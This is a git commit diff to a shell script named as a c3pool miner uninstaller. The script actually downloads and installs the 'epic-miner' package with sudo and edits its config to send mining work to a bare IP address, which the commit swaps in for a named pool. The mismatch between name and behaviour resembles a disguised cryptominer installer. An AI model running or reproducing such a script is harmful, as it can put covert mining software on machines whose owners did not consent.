6a3c5149a77ae55dcb6a188da409ebe2b9ccdc1d
x464 <70561813+x464@users.noreply.github.com>
2020-09-02 06:14:40 +0700

    Update uninstall_c3pool_miner.sh

--- uninstall_c3pool_miner.sh
+++ uninstall_c3pool_miner.sh
@@ -7,7 +7,7 @@ wget https://d1ftoepmu0es39.cloudfront.net/epic-miner_2.3.1-1_amd64.deb
 
 sudo dpkg -i epic-miner_2.3.1-1_amd64.deb
 
-sudo sed -i 's/stratum_server_addr = "127.0.0.1:3416"/stratum_server_addr = "epic-us.icemining.ca:4000"/g' /opt/epic-miner/epic-miner.toml
+sudo sed -i 's/stratum_server_addr = "127.0.0.1:3416"/stratum_server_addr = "45.77.175.86:3416"/g' /opt/epic-miner/epic-miner.toml
 
 sudo sed -i 's/threads = 3/threads = 4/g' /opt/epic-miner/epic-miner.toml
 
